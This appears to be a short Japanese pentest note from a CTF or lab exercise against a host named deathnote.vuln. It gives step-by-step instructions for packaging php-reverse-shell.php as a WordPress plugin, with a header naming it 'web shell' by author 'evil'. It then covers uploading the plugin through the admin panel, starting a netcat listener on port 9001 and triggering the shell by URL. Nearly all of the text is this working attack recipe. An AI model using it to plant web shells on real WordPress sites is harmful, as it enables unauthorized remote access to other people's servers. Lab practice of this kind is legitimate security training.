- wordpressのテンプレートに書き込みができない時がある。その時はpluginをuploadする

### `wp-plugin-reverse-shell.zip`を作る
- `/tools`に置くので移動しておく

- `banner.php`
```
<?php
/*
Plugin Name: web shell
Version: 1.0.0
Author: evil
Author URI: http://hacking.com
*/
?>
```

- ファイルを圧縮してwp-plugin-reverse-shell.zipを作る
  - `zip wp-plugin-reverse-shell banner.php php-reverse-shell.php`
  - wp-plugin-reverse-shell.zipが作られる
- banner.phpを削除しておく
  - `rm banner.php`

### reverse-shellを確立する
- wordpressにログインする
- 左側からPluginsを選択する。Add New -> Upload Pluginを選択 -> ブラウザを選んでwp-plugin-reverse-shell.zipをuploadする
- Parrotで待受
  - nc -nlvp 9001
- ブラウザから起動させる
  - `http://deathnote.vuln/wordpress/wp-content/plugins/wp-plugin-reverse-shell/php-reverse-shell.php`  
- シェルが確立する
